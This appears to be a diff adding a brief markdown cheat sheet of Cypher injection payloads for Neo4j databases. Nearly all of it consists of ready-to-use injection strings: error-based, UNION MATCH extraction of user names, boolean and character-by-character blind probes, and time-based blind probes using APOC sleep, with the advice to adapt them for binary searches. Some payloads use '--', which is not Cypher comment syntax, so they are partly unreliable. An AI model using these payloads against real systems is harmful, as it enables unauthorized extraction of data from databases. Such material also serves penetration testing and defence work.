@@ -1,0 +1,23 @@
+# Neo4j
+
+Neo4j uses Cypher query language, injection if not parameterized.
+
+## Error-based
+' + 1/0 -- to error.
+
+## Union query-based
+' UNION MATCH (u:User) RETURN u.name --
+
+## Boolean-based blind
+' WHERE LENGTH(n.name)>16 RETURN n --
+
+Binary.
+
+' WHERE ASCII(SUBSTRING(n.name,0,1))>109 --
+
+## Time-based blind
+If APOC library: ' CALL apoc.util.sleep(5000) --
+
+Condition: if LENGTH(n.name)>16 CALL apoc.util.sleep(5000) 
+
+Adapt for binary searches.
